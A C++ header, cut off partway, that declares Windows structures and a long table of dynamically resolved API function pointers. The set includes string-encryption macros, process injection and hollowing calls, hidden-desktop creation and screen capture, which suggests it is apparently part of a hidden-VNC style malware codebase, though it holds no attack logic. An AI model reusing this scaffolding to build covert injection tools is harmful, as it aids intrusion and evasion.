#pragma once
#include "Common.h"

#define ENC_STR_A
#if _MSC_VER >= 1900

inline const char* operator "" END_ENC_STR(const char* str, size_t n)
{
    return str;
}
#else
#define END_ENC_STR
#endif

typedef struct _LSA_UNICODE_STRING
{
   USHORT Length;
   USHORT MaximumLength;
   PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
   ULONG           Length;
   HANDLE          RootDirectory;
   PUNICODE_STRING ObjectName;
   ULONG           Attributes;
   PVOID           SecurityDescriptor;
   PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define OBJ_CASE_INSENSITIVE 0x00000040L

struct CLIENT_ID { DWORD UniqueProcess; DWORD UniqueThread; };

typedef struct _PROCESS_BASIC_INFORMATION
{
   PVOID     Reserved1;
   PVOID     PebBaseAddress;
   PVOID     Reserved2[2];
   ULONG_PTR UniqueProcessId;
   PVOID     Reserved3;
} PROCESS_BASIC_INFORMATION;

namespace Types
{
   typedef int (WINAPI *T_MessageBox)
   (
      HWND    hWnd,
      PCHAR lpText,
      PCHAR lpCaption,
      UINT    uType
   );
   typedef UINT (WINAPI *T_GetWindowsDirectory)
   (
      PCHAR lpBuffer,
      UINT   uSize
   );
   typedef int (WINAPI *T_WideCharToMultiByte)
   (
      UINT    CodePage,
      DWORD   dwFlags,
      PWCHAR  lpWideCharStr,
      int     cchWideChar,
      PCHAR   lpMultiByteStr,
      int     cbMultiByte,
      PCHAR   lpDefaultChar,
      LPBOOL  lpUsedDefaultChar
   );   
   typedef HLOCAL (WINAPI *T_LocalAlloc)
   (
      UINT   uFlags,
      SIZE_T uBytes
   );
   typedef int (__cdecl *T_wsprintf)
   (
      LPTSTR  lpOut,
      LPCTSTR lpFmt,
      ...
   );
   typedef int (WINAPI *T_MultiByteToWideChar)
   (
      UINT   CodePage,                           
      DWORD  dwFlags,
      LPCTSTR lpMultiByteStr,
      int    cbMultiByte,
      LPWSTR lpWideCharStr,
      int    cchWideChar
   );
   typedef void *(__cdecl *T_malloc)
   (  
      size_t size   
   );
   typedef void (__cdecl *T_free)
   (   
      void *memblock   
   );
   typedef LPVOID (WINAPI *T_VirtualAllocEx)
   (
      HANDLE hProcess,
      LPVOID lpAddress,
      SIZE_T dwSize,
      DWORD  flAllocationType,
      DWORD  flProtect
   );
   typedef BOOL (WINAPI *T_WriteProcessMemory)
   (
      HANDLE   hProcess,
      LPVOID   lpBaseAddress,
      LPCVOID  lpBuffer,
      SIZE_T   nSize,
      SIZE_T  *lpNumberOfBytesWritten
   );
   typedef HANDLE (WINAPI *T_CreateRemoteThread)
   (
      HANDLE                 hProcess,
      LPSECURITY_ATTRIBUTES  lpThreadAttributes,
      SIZE_T                 dwStackSize,
      LPTHREAD_START_ROUTINE lpStartAddress,
      LPVOID                 lpParameter,
      DWORD                  dwCreationFlags,
      LPDWORD                lpThreadId
   );
   typedef HMODULE (WINAPI *T_LoadLibrary)
   (
      LPCTSTR lpFileName
   );
   typedef FARPROC (WINAPI *T_GetProcAddress)
   (
      HMODULE hModule,
      LPCTSTR lpProcName
   );
   typedef BOOL (WINAPI *T_PathRemoveFileSpec)
   (
      PCHAR pszPath
   );
   typedef DWORD (WINAPI *T_GetModuleFileName)
   (
      HMODULE hModule,
      PCHAR  lpFilename,
      DWORD   nSize
   );
   typedef PCHAR (WINAPI *T_PathFindFileName)
   (
      PCHAR pPath
   );
   typedef int (__cdecl *T_strncmp)
   (  
      const char *string1,  
      const char *string2,  
      size_t count   
   );
   typedef int (WINAPI *T_lstrlen)
   (
      LPCTSTR lpString
   );
   typedef VOID (WINAPI *T_ExitProcess)
   (
      UINT uExitCode
   );
   typedef HRESULT (WINAPI *T_SHGetFolderPath)
   (
      HWND   hwndOwner,
      int    nFolder,
      HANDLE hToken,
      DWORD  dwFlags,
      LPCTSTR pszPath
   );
   typedef PCHAR (WINAPI *T_lstrcpy)
   (
      LPTSTR  lpString1,
      LPCTSTR lpString2
   );
   typedef PCHAR (WINAPI *T_lstrcat)
   (
      LPTSTR  lpString1,
      LPCTSTR lpString2
   );
   typedef BOOL (WINAPI *T_CopyFile)
   (
      LPCTSTR lpExistingFileName,
      LPCTSTR lpNewFileName,
      BOOL  bFailIfExists
   );
   typedef BOOL (WINAPI *T_GetVolumeInformation)
   (
      PCHAR   lpRootPathName,
      PCHAR   lpVolumeNameBuffer,
      DWORD   nVolumeNameSize,
      LPDWORD lpVolumeSerialNumber,
      LPDWORD lpMaximumComponentLength,
      LPDWORD lpFileSystemFlags,
      PCHAR   lpFileSystemNameBuffer,
      DWORD   nFileSystemNameSize
   );
   typedef BOOLEAN (WINAPI *T_GetUserNameEx)
   (
      EXTENDED_NAME_FORMAT NameFormat,
      PCHAR                lpNameBuffer,
      PULONG               lpnSize
   );
   typedef BOOL (WINAPI *T_LookupAccountName)
   (
      PCHAR         lpSystemName,
      PCHAR         lpAccountName,
      PSID          Sid,
      LPDWORD       cbSid,
      PCHAR         ReferencedDomainName,
      LPDWORD       cchReferencedDomainName,
      PSID_NAME_USE peUse
   );
   typedef BOOL (WINAPI *T_ConvertSidToStringSid)
   (
      PSID   Sid,
      PCHAR *StringSid
   );
   typedef HLOCAL (WINAPI *T_LocalFree)
   (
      HLOCAL hMem
   );
   typedef void (__cdecl *T_memcpy)
   (  
      void *dest,  
      const void *src,  
      size_t count   
   );
   typedef int (WINAPI *T_lstrcmp)
   (
      LPCTSTR lpString1,
      LPCTSTR lpString2
   );
   typedef PCHAR (WINAPI *T_StrStr)
   (
      LPCTSTR  pszFirst,
      LPCTSTR  pszSrch
   );
   typedef long (_cdecl *T_strtol)
   (  
      const char *nptr,  
      char      **endptr,  
      int         base   
   );
   typedef void *(_cdecl *T_realloc)
   (  
      void *memblock,  
      size_t size   
   );
   typedef int (WINAPI *T_WSAStartup)
   (
      WORD      wVersionRequested,
      LPWSADATA lpWSAData
   );
   typedef SOCKET (WINAPI *T_socket)
   (
      int af,
      int type,
      int protocol
   );
   typedef struct hostent* (WINAPI *T_gethostbyname)
   (
      const char *name
   );
   typedef u_short (WINAPI *T_htons)
   (
      u_short hostshort
   );
   typedef int (WINAPI *T_connect)
   (
      SOCKET                 s,
      const struct sockaddr *name,
      int                    namelen
   );
   typedef int (WINAPI *T_send)
   (
      SOCKET      s,
      const char *buf,
      int         len,
      int         flags
   );
   typedef int (WINAPI *T_recv)
   (
      SOCKET  s,
      char   *buf,
      int     len,
      int     flags
   );
   typedef int (WINAPI *T_closesocket)
   (
      SOCKET s
   );
   typedef int (WINAPI *T_WSACleanup)();
   typedef void *(_cdecl *T_memset)
   (  
      void  *dest,  
      int    c,  
      size_t count   
   );
   typedef VOID (WINAPI *T_Sleep)
   (
      DWORD dwMilliseconds
   );
   typedef NTSTATUS (NTAPI *T_NtOpenKey)
   ( 
      PHANDLE            KeyHandle,
      ACCESS_MASK        DesiredAccess,
      POBJECT_ATTRIBUTES ObjectAttributes
   );
   typedef NTSTATUS (NTAPI *T_NtSetValueKey)(
      HANDLE          KeyHandle,
      PUNICODE_STRING ValueName,
      ULONG           TitleIndex,
      ULONG           Type,
      PVOID           Data,
      ULONG           DataSize
   );
   typedef BOOL (WINAPI *T_CloseHandle)
   (
      HANDLE hObject
   );
   typedef NTSTATUS (NTAPI *T_RtlCreateUserThread)
   (
      HANDLE               ProcessHandle,
      PSECURITY_DESCRIPTOR SecurityDescriptor,
      BOOLEAN              CreateSuspended,
      ULONG                StackZeroBits,
      PULONG               StackReserved,
      PULONG               StackCommit,
      PVOID                StartAddress,
      PVOID                StartParameter,
      PHANDLE              ThreadHandle,
      CLIENT_ID           *ClientID
   );
   typedef BOOL (WINAPI *T_CreateProcess)
   (
      PCHAR                  lpApplicationName,
      PCHAR                  lpCommandLine,
      LPSECURITY_ATTRIBUTES  lpProcessAttributes,
      LPSECURITY_ATTRIBUTES  lpThreadAttributes,
      BOOL                   bInheritHandles,
      DWORD                  dwCreationFlags,
      LPVOID                 lpEnvironment,
      PCHAR                  lpCurrentDirectory,
      LPSTARTUPINFOA         lpStartupInfo,
      LPPROCESS_INFORMATION  lpProcessInformation
   );
   typedef VOID (WINAPI *T_InitializeCriticalSection)
   (
      LPCRITICAL_SECTION lpCriticalSection
   );
   typedef VOID (WINAPI *T_EnterCriticalSection)
   (
      LPCRITICAL_SECTION lpCriticalSection
   );
   typedef VOID (WINAPI *T_LeaveCriticalSection)
   (
      LPCRITICAL_SECTION lpCriticalSection
   );
   typedef DWORD (WINAPI *T_GetLastError)();
   typedef INT* (__cdecl *T_errno)();
   typedef INT (__cdecl *T_tolower)
   (
      INT _C
   );
   typedef INT (__cdecl *T_isdigit)
   (
      INT _C
   );
   typedef ULONG (__cdecl *T_strtoul)
   (
      const char *Str,
      char      **EndPtr,
      int         Radix
   );
   typedef INT (__cdecl *T_isxdigit)
   (
      INT _C
   );
   typedef double (__cdecl *T_strtod)
   (
      const char *Str,
      char **EndPtr
   );
   typedef HANDLE (WINAPI *T_CreateToolhelp32Snapshot)
   (
      DWORD dwFlags,
      DWORD th32ProcessID
   );
   typedef BOOL (WINAPI *T_Process32First)
   (
      HANDLE           hSnapshot,
      LPPROCESSENTRY32 lppe
   );
   typedef BOOL (WINAPI *T_Process32Next)
   (
      HANDLE           hSnapshot,
      LPPROCESSENTRY32 lppe
   );
   typedef PTSTR (WINAPI *T_StrChr)
   (
      PCHAR pszStart,
      CHAR  wMatch
   );
   typedef int (WINAPI *T_StrToInt)
   (
      PCHAR pszSrc
   );
   typedef HMODULE (WINAPI *T_GetModuleHandle)
   (
      PCHAR lpModuleName
   );
   typedef DWORD (WINAPI *T_GetFileVersionInfoSize)
   (
      PCHAR   lptstrFilename,
      LPDWORD lpdwHandle
   );
   typedef BOOL (WINAPI *T_GetFileVersionInfo)
   (
      PCHAR   lptstrFilename,
      DWORD   dwHandle,
      DWORD   dwLen,
      LPVOID  lpData
   );
   typedef BOOL (WINAPI *T_VerQueryValue)
   (
      LPCVOID  pBlock,
      PCHAR    lpSubBlock,
      LPVOID  *lplpBuffer,
      PUINT    puLen
   );
   typedef BOOL (WINAPI *T_GetModuleInformation)
   (
      HANDLE       hProcess,
      HMODULE      hModule,
      LPMODULEINFO lpmodinfo,
      DWORD        cb
   );
   typedef int (_cdecl *T_memcmp)
   (  
      const void *buf1,  
      const void *buf2,  
      size_t count  
   );
   typedef DWORD (WINAPI *T_ExpandEnvironmentStrings)
   (
      LPCTSTR lpSrc,
      LPTSTR  lpDst,
      DWORD   nSize
   );
   typedef DWORD (WINAPI *T_GetPrivateProfileSectionNames)
   (
      PCHAR lpszReturnBuffer,
      DWORD nSize,
      PCHAR lpFileName
   );
   typedef DWORD (WINAPI *T_GetPrivateProfileString)
   (
      LPCTSTR lpAppName,
      LPCTSTR lpKeyName,
      LPCTSTR lpDefault,
      LPCTSTR lpReturnedString,
      DWORD   nSize,
      LPCTSTR lpFileName
   );
   typedef HANDLE (WINAPI *T_CreateFile)
   (
      PCHAR                 lpFileName,
      DWORD                 dwDesiredAccess,
      DWORD                 dwShareMode,
      LPSECURITY_ATTRIBUTES lpSecurityAttributes,
      DWORD                 dwCreationDisposition,
      DWORD                 dwFlagsAndAttributes,
      HANDLE                hTemplateFile
   );
   typedef BOOL (WINAPI *T_ReadFile)
   (
      HANDLE       hFile,
      LPVOID       lpBuffer,
      DWORD        nNumberOfBytesToRead,
      LPDWORD      lpNumberOfBytesRead,
      LPOVERLAPPED lpOverlapped
   );
   typedef BOOL (WINAPI *T_WriteFile)
   (
      HANDLE       hFile,
      LPCVOID      lpBuffer,
      DWORD        nNumberOfBytesToWrite,
      LPDWORD      lpNumberOfBytesWritten,
      LPOVERLAPPED lpOverlapped
   );
   typedef LONG (WINAPI *T_RegSetValueEx)
   (
      HKEY    hKey,
      LPCTSTR lpValueName,
      DWORD   Reserved,
      DWORD   dwType,
      BYTE   *lpData,
      DWORD   cbData
   );
   typedef LONG (WINAPI *T_RegOpenKeyEx)
   (
      HKEY    hKey,
      LPCTSTR lpSubKey,
      DWORD   ulOptions,
      REGSAM  samDesired,
      PHKEY   phkResult
   );
   typedef LONG (WINAPI *T_RegCloseKey)
   (
      HKEY hKey
   );
   typedef DWORD (WINAPI *T_GetFileSize)
   (
      HANDLE  hFile,
      LPDWORD lpFileSizeHigh
   );
   typedef DWORD (WINAPI *T_ResumeThread)
   (
      HANDLE hThread
   );
   typedef BOOL (WINAPI *T_IsWow64Process)
   (
      HANDLE hProcess,
      PBOOL  Wow64Process
   );
   typedef void (WINAPI *T_GetNativeSystemInfo)
   (
      LPSYSTEM_INFO lpSystemInfo
   );
   typedef HANDLE (WINAPI *T_OpenProcess)
   (
      DWORD dwDesiredAccess,
      BOOL  bInheritHandle,
      DWORD dwProcessId
   );
   typedef HANDLE (WINAPI *T_CreateThread)
   (
      LPSECURITY_ATTRIBUTES  lpThreadAttributes,
      SIZE_T                 dwStackSize,
      LPTHREAD_START_ROUTINE lpStartAddress,
      LPVOID                 lpParameter,
      DWORD                  dwCreationFlags,
      LPDWORD                lpThreadId
   );
   typedef BOOL (WINAPI *T_GetUserName)
   (
      PWCHAR  lpBuffer,
      LPDWORD lpnSize
   );
   typedef BOOL (WINAPI *T_GetComputerName)
   (
      PWCHAR  lpBuffer,
      LPDWORD lpnSize
   );
   typedef BOOL (WINAPI *T_GetVersionEx)
   (
      LPOSVERSIONINFOA lpVersionInfo
   );
   typedef HANDLE (WINAPI *T_CreateNamedPipe)
   (
      LPCTSTR               lpName,
      DWORD                 dwOpenMode,
      DWORD                 dwPipeMode,
      DWORD                 nMaxInstances,
      DWORD                 nOutBufferSize,
      DWORD                 nInBufferSize,
      DWORD                 nDefaultTimeOut,
      LPSECURITY_ATTRIBUTES lpSecurityAttributes
   );
   typedef BOOL (WINAPI *T_ConnectNamedPipe)
   (
      HANDLE       hNamedPipe,
      LPOVERLAPPED lpOverlapped
   );
   typedef BOOL (WINAPI *T_DisconnectNamedPipe)
   (
      HANDLE hNamedPipe
   );
   typedef BOOL (WINAPI *T_InternetCrackUrl)
   (
      PCHAR             lpszUrl,
      DWORD             dwUrlLength,
      DWORD             dwFlags,
      LPURL_COMPONENTSA lpUrlComponents
   );
   typedef DWORD (WINAPI *T_GetTempPath)
   (
      DWORD nBufferLength,
      PCHAR lpBuffer
   );
   typedef UINT (WINAPI *T_GetTempFileName)
   (
      PCHAR  lpPathName,
      PCHAR  lpPrefixString,
      UINT   uUnique,
      LPTSTR lpTempFileName
   );
   typedef HINSTANCE (WINAPI *T_ShellExecute)
   (
      HWND    hwnd,
      PCHAR   lpOperation,
      PCHAR   lpFile,
      PCHAR   lpParameters,
      PCHAR   lpDirectory,
      INT     nShowCmd
   );
   typedef int (WINAPI *T_ioctlsocket)
   (
      SOCKET  s,
      long    cmd,
      u_long *argp
   );
   typedef u_short (WINAPI *T_ntohs)
   (
      u_short netshort
   );
   typedef HANDLE (WINAPI *T_CreateMutex)
   (
      LPSECURITY_ATTRIBUTES lpMutexAttributes,
      BOOL                  bInitialOwner,
      PCHAR                 lpName
   );
   typedef BOOL (WINAPI *T_ReleaseMutex)
   (
      HANDLE hMutex
   );
   typedef NTSTATUS (WINAPI *T_NtCreateThreadEx) 
   (
      PHANDLE                hThread,
      ACCESS_MASK            DesiredAccess,
      LPVOID                 ObjectAttributes,
      HANDLE                 ProcessHandle,
      LPTHREAD_START_ROUTINE lpStartAddress,
      LPVOID                 lpParameter,
      BOOL                   CreateSuspended, 
      ULONG                  StackZeroBits,
      ULONG                  SizeOfStackCommit,
      ULONG                  SizeOfStackReserve,
      LPVOID                 lpBytesBuffer
   );
   typedef BOOL (WINAPI *T_TerminateProcess)
   (
      HANDLE hProcess,
      UINT   uExitCode
   );
   typedef HWND (WINAPI *T_FindWindow)
   (
      LPCTSTR lpClassName,
      LPCTSTR lpWindowName
   );
   typedef DWORD (WINAPI *T_GetWindowThreadProcessId)
   (
      HWND    hWnd,
      LPDWORD lpdwProcessId
   );
   typedef DWORD (WINAPI *T_WaitForSingleObject)
   (
      HANDLE hHandle,
      DWORD  dwMilliseconds
   );
   typedef BOOL (WINAPI *T_EnumWindows)
   (
      WNDENUMPROC lpEnumFunc,
      LPARAM      lParam
   );
   typedef DWORD (WINAPI *T_GetCurrentProcessId)();
   typedef BOOL (WINAPI *T_DeleteFile)
   (
      PCHAR lpFileName
   );
   typedef BOOL (WINAPI *T_PathFileExists)
   (
      PCHAR pszPath
   );
   typedef BOOL (WINAPI *T_CreateDirectory)
   (
      PCHAR                 lpPathName,
      LPSECURITY_ATTRIBUTES lpSecurityAttributes
   );
   typedef BOOL (WINAPI *T_HttpQueryInfo)
   (
      HINTERNET hRequest,
      DWORD     dwInfoLevel,
      LPVOID    lpvBuffer,
      LPDWORD   lpdwBufferLength,
      LPDWORD   lpdwIndex
   );
   typedef NTSTATUS (NTAPI *T_RtlCompressBuffer)
   (
      USHORT CompressionFormatAndEngine,
      PUCHAR UncompressedBuffer,
      ULONG  UncompressedBufferSize,
      PUCHAR CompressedBuffer,
      ULONG  CompressedBufferSize,
      ULONG  UncompressedChunkSize,
      PULONG FinalCompressedSize,
      PVOID  WorkSpace
   );
   typedef NTSTATUS (NTAPI *T_RtlGetCompressionWorkSpaceSize)
   (
      USHORT CompressionFormatAndEngine,
      PULONG CompressBufferWorkSpaceSize,
      PULONG CompressFragmentWorkSpaceSize
   );
   typedef BOOL (WINAPI *T_SetThreadDesktop)
   (
      HDESK hDesktop
   );
   typedef HDESK (WINAPI *T_CreateDesktop)
   (
      PCHAR                 lpszDesktop,
      PCHAR                 lpszDevice,
      DEVMODE              *pDevmode,
      DWORD                 dwFlags,
      ACCESS_MASK           dwDesiredAccess,
      LPSECURITY_ATTRIBUTES lpsa
   );
   typedef HDESK (WINAPI *T_OpenDesktop)
   (
      PCHAR       lpszDesktop,
      DWORD       dwFlags,
      BOOL        fInherit,
      ACCESS_MASK dwDesiredAccess
   );
   typedef BOOL (WINAPI *T_TerminateThread)
   (
      HANDLE hThread,
      DWORD  dwExitCode
   );
   typedef BOOL (WINAPI *T_PostMessage) 
   (
      HWND   hWnd,
      UINT   Msg,
      WPARAM wParam,
      LPARAM lParam
   );
   typedef HWND (WINAPI *T_ChildWindowFromPoint)
   (
      HWND  hWndParent,
      POINT Point
   );
   typedef BOOL (WINAPI *T_ScreenToClient)
   (
      HWND    hWnd,
      LPPOINT lpPoint
   );
   typedef BOOL (WINAPI *T_MoveWindow)
   (
      HWND hWnd,
      int  X,
      int  Y,
      int  nWidth,
      int  nHeight,
      BOOL bRepaint
   );
   typedef BOOL (WINAPI *T_GetWindowRect)
   (
      HWND   hWnd,
      LPRECT lpRect
   );
   typedef UINT (WINAPI *T_GetMenuItemID)
   (
      HMENU hMenu,
      int   nPos
   );
   typedef int (WINAPI *T_MenuItemFromPoint)
   (
      HWND  hWnd,
      HMENU hMenu,
      POINT ptScreen
   );
   typedef UINT (WINAPI *T_RealGetWindowClass)
   (
      HWND   hwnd,
      LPTSTR pszType,
      UINT   cchType
   );
   typedef BOOL (WINAPI *T_PtInRect)
   (
      const RECT  *lprc,
            POINT  pt
   );
   typedef BOOL (WINAPI *T_GetWindowPlacement)
   (
      HWND             hWnd,
      WINDOWPLACEMENT *lpwndpl
   );
   typedef LONG (WINAPI *T_SetWindowLong)
   (
      HWND hWnd,
      int  nIndex,
      LONG dwNewLong
   ); 
   typedef LONG (WINAPI *T_GetWindowLong)
   (
      HWND hWnd,
      int  nIndex
   );
   typedef HWND (WINAPI *T_WindowFromPoint)
   (
      POINT Point
   ); 
   typedef UINT_PTR (WINAPI *T_SHAppBarMessage)
   (
      DWORD       dwMessage,
      PAPPBARDATA pData
   );
   typedef LONG (WINAPI *T_RegQueryValueEx)
   (
      HKEY    hKey,
      LPCTSTR lpValueName,
      LPDWORD lpReserved,
      LPDWORD lpType,
      LPBYTE  lpData,
      LPDWORD lpcbData
   );
   typedef HWND (WINAPI *T_GetDesktopWindow)();
   typedef BOOL (WINAPI *T_DeleteDC)
   (
      HDC hdc
   );
   typedef int (WINAPI *T_ReleaseDC)
   (
      HWND hWnd,
      HDC  hDC
   );
   typedef BOOL (WINAPI *T_DeleteObject)
   (
      HGDIOBJ hObject
   );
   typedef int (WINAPI *T_GetDIBits)
   (
      HDC          hdc,
      HBITMAP      hbmp,
      UINT         uStartScan,
      UINT         cScanLines,
      LPVOID       lpvBits,
      LPBITMAPINFO lpbi,
      UINT         uUsage
   );
   typedef BOOL (WINAPI *T_StretchBlt)
   (
      HDC   hdcDest,
      int   nXOriginDest,
      int   nYOriginDest,
      int   nWidthDest,
      int   nHeightDest,
      HDC   hdcSrc,
      int   nXOriginSrc,
      int   nYOriginSrc,
      int   nWidthSrc,
      int   nHeightSrc,
      DWORD dwRop
   );
   typedef int (WINAPI *T_SetStretchBltMode)
   (
      HDC hdc,
      int iStretchMode
   );
   typedef HGDIOBJ (WINAPI *T_SelectObject)
   (
      HDC     hdc,
      HGDIOBJ hgdiobj
   );
   typedef HDC (WINAPI *T_CreateCompatibleDC)
   (
      HDC hdc
   );
   typedef HBITMAP (WINAPI *T_CreateCompatibleBitmap)
   (
      HDC hdc,
      int nWidth,
      int nHeight
   );
   typedef HDC (WINAPI *T_GetDC)
   (
      HWND hWnd
   );
   typedef BOOL (WINAPI *T_IsWindowVisible)
   (
      HWND hWnd
   );
   typedef HWND (WINAPI *T_GetWindow)
   (
      HWND hWnd,
      UINT uCmd
   );
   typedef BOOL (WINAPI *T_BitBlt)
   (
      HDC   hdcDest,
      int   nXDest,
      int   nYDest,
      int   nWidth,
      int   nHeight,
      HDC   hdcSrc,
      int   nXSrc,
      int   nYSrc,
      DWORD dwRop
   );
   typedef BOOL (WINAPI *T_PrintWindow)
   (
      HWND hwnd,
      HDC  hdcBlt,
      UINT nFlags
   );
   typedef HWND (WINAPI *T_GetTopWindow)
   (
      HWND hWnd
   );
   typedef NTSTATUS (WINAPI *T_NtUnmapViewOfSection)
   (
      HANDLE ProcessHandle,
      PVOID  BaseAddress
   );
   typedef NTSTATUS (WINAPI *T_NtQueryInformationProcess)
   (
      HANDLE ProcessHandle,
      LPVOID ProcessInformationClass,
      PVOID  ProcessInformation,
      ULONG  ProcessInformationLength,
      PULONG ReturnLength
   );
   typedef BOOL (WINAPI *T_GetThreadContext)
   (
      HANDLE    hThread,
      LPCONTEXT lpContext
   );
   typedef BOOL (WINAPI *T_SetThreadContext)
   (
      HANDLE  hThread,
      const CONTEXT *lpContext
   );
   typedef int (WINAPI *T_SHFileOperation)
   (
      LPSHFILEOPSTRUCTA lpFileOp
   );
   typedef HANDLE (WINAPI *T_FindFirstFile)
   (
      char              *lpFileName,
      LPWIN32_FIND_DATAA lpFindFileData
   );
   typedef BOOL (WINAPI *T_FindNextFile)
   (
      HANDLE             hFindFile,
      LPWIN32_FIND_DATAA lpFindFileData
   );
}

namespace Funcs
{               
   extern Types::T_CloseHandle                    pCloseHandle;                          
   extern Types::T_MessageBox                     pMessageBoxA;
   extern Types::T_GetWindowsDirectory            pGetWindowsDirectoryA;
   extern Types::T_WideCharToMultiByte            pWideCharToMultiByte;
   extern Types::T_LocalAlloc                     pLocalAlloc;
   extern Types::T_wsprintf                       pWsprintfA;
   extern Types::T_MultiByteToWideChar            pMultiByteToWideChar;
   extern Types::T_malloc                         pMalloc;
   extern Types::T_free                           pFree;
   extern Types::T_VirtualAllocEx                 pVirtualAllocEx;
   extern Types::T_WriteProcessMemory             pWriteProcessMemory;
   extern Types::T_CreateRemoteThread             pCreateRemoteThread;
   extern Types::T_LoadLibrary                    pLoadLibraryA;
   extern Types::T_GetProcAddress                 pGetProcAddress;
   extern Types::T_PathRemoveFileSpec             pPathRemoveFileSpecA;
   extern Types::T_GetModuleFileName              pGetModuleFileNameA;
   extern Types::T_PathFindFileName               pPathFindFileNameA;
   extern Types::T_strncmp                        pStrncmp;
   extern Types::T_strncmp                        pStrnicmp;
   extern Types::T_lstrlen                        pLstrlenA;
   extern Types::T_ExitProcess                    pExitProcess;
   extern Types::T_SHGetFolderPath                pSHGetFolderPathA;
   extern Types::T_lstrcpy                        pLstrcpyA;
   extern Types::T_lstrcat                        pLstrcatA;
   extern Types::T_CopyFile                       pCopyFileA;
   extern Types::T_GetVolumeInformation           pGetVolumeInformationA;
   extern Types::T_GetUserNameEx                  pGetUserNameExA;
   extern Types::T_LookupAccountName              pLookupAccountNameA;
   extern Types::T_ConvertSidToStringSid          pConvertSidToStringSidA;
   extern Types::T_LocalFree                      pLocalFree;
   extern Types::T_memcpy                         pMemcpy;
   extern Types::T_lstrcmp                        pLstrcmpiA;
   extern Types::T_lstrcmp                        pLstrcmpA;
   extern Types::T_StrStr                         pStrStrA;
   extern Types::T_StrStr                         pStrStrIA;
   extern Types::T_strtol                         pStrtol;
   extern Types::T_realloc                        pRealloc;
   extern Types::T_WSAStartup                     pWSAStartup;
   extern Types::T_socket                         pSocket;
   extern Types::T_gethostbyname                  pGethostbyname;
   extern Types::T_htons                          pHtons;
   extern Types::T_connect                        pConnect;
   extern Types::T_send                           pSend;
   extern Types::T_recv                           pRecv;
   extern Types::T_closesocket                    pClosesocket;
   extern Types::T_WSACleanup                     pWSACleanup;
   extern Types::T_memset                         pMemset;
   extern Types::T_Sleep                          pSleep;
   extern Types::T_NtOpenKey                      pNtOpenKey;
   extern Types::T_NtSetValueKey                  pNtSetValueKey;
   extern Types::T_RtlCreateUserThread            pRtlCreateUserThread;
   extern Types::T_CreateProcess                  pCreateProcessA;
   extern Types::T_InitializeCriticalSection      pInitializeCriticalSection;
   extern Types::T_LeaveCriticalSection           pLeaveCriticalSection;
   extern Types::T_EnterCriticalSection           pEnterCriticalSection;
   extern Types::T_GetLastError                   pGetLastError;
   extern Types::T_errno                          pErrno;
   extern Types::T_tolower                        pTolower;
   extern Types::T_isdigit                        pIsdigit;
   extern Types::T_strtoul                        pStrtoul;
   extern Types::T_isxdigit                       pIsxdigit;
   extern Types::T_strtod                         pStrtod;
   extern Types::T_CreateToolhelp32Snapshot       pCreateToolhelp32Snapshot;
   extern Types::T_Process32First                 pProcess32First;
   extern Types::T_Process32Next                  pProcess32Next;
   extern Types::T_StrChr                         pStrChrA;
   extern Types::T_StrToInt                       pStrToIntA;
   extern Types::T_GetModuleHandle                pGetModuleHandleA;
   extern Types::T_GetFileVersionInfoSize         pGetFileVersionInfoSizeA;
   extern Types::T_GetFileVersionInfo             pGetFileVersionInfoA;
   extern Types::T_VerQueryValue                  pVerQueryValueA;
   extern Types::T_GetModuleInformation           pGetModuleInformation;
   extern Types::T_memcmp                         pMemcmp;
   extern Types::T_ExpandEnvironmentStrings       pExpandEnvironmentStringsA;
   extern Types::T_GetPrivateProfileSectionNames  pGetPrivateProfileSectionNamesA;
   extern Types::T_GetPrivateProfileString        pGetPrivateProfileStringA;
   extern Types::T_CreateFile                     pCreateFileA;
   extern Types::T_ReadFile                       pReadFile;
   extern Types::T_WriteFile                      pWriteFile;
   extern Types::T_RegSetValueEx                  pRegSetValueExA;
   extern Types::T_RegOpenKeyEx                   pRegOpenKeyExA;
   extern Types::T_RegCloseKey                    pRegCloseKey;
   extern Types::T_GetFileSize                    pGetFileSize;
   extern Types::T_ResumeThread                   pResumeThread;
   extern Types::T_IsWow64Process                 pIsWow64Process;
   extern Types::T_GetNativeSystemInfo            pGetNativeSystemInfo;
   extern Types::T_OpenProcess                    pOpenProcess;
   extern Types::T_CreateThread                   pCreateThread;
   extern Types::T_GetUserName                    pGetUserNameW;
   extern Types::T_GetComputerName                pGetComputerNameW;
   extern Types::T_GetVersionEx                   pGetVersionExA;
   extern Types::T_CreateNamedPipe                pCreateNamedPipeA;
   extern Types::T_ConnectNamedPipe               pConnectNamedPipe;
   extern Types::T_DisconnectNamedPipe            pDisconnectNamedPipe;
   extern Types::T_InternetCrackUrl               pInternetCrackUrlA;
   extern Types::T_GetTempPath                    pGetTempPathA;
   extern Types::T_GetTempFileName                pGetTempFileNameA;
   extern Types::T_ShellExecute                   pShellExecuteA;
   extern Types::T_ioctlsocket                    pIoctlsocket;
   extern Types::T_ntohs                          pNtohs;
   extern Types::T_CreateMutex                    pCreateMutexA;
   extern Types::T_ReleaseMutex                   pReleaseMutex;
   extern Types::T_NtCreateThreadEx               pNtCreateThreadEx;
   extern Types::T_TerminateProcess               pTerminateProcess;
   extern Types::T_FindWindow                     pFindWindowA;
   extern Types::T_GetWindowThreadProcessId       pGetWindowThreadProcessId;
   extern Types::T_WaitForSingleObject            pWaitForSingleObject;
   extern Types::T_EnumWindows                    pEnumWindows;
   extern Types::T_GetCurrentProcessId            pGetCurrentProcessId;
   extern Types::T_DeleteFile                     pDeleteFileA;
   extern Types::T_PathFileExists                 pPathFileExistsA;
   extern Types::T_CreateDirectory                pCreateDirectoryA;
   extern Types::T_HttpQueryInfo                  pHttpQueryInfoA;
   extern Types::T_HttpQueryInfo                  pHttpQueryInfoW;
   extern Types::T_RtlCompressBuffer              pRtlCompressBuffer;
   extern Types::T_RtlGetCompressionWorkSpaceSize pRtlGetCompressionWorkSpaceSize;
   extern Types::T_SetThreadDesktop               pSetThreadDesktop;
   extern Types::T_CreateDesktop                  pCreateDesktopA;
   extern Types::T_OpenDesktop                    pOpenDesktopA;
   extern Types::T_TerminateThread                pTerminateThread;
   extern Types::T_PostMessage                    pPostMessageA;
   extern Types::T_PostMessage                    pSendMessageA;
   extern Types::T_ChildWindowFromPoint           pChildWindowFromPoint;
   extern Types::T_ScreenToClient                 pScreenToClient;
   extern Types::T_MoveWindow                     pMoveWindow;
   extern Types::T_GetWindowRect                  pGetWindowRect;
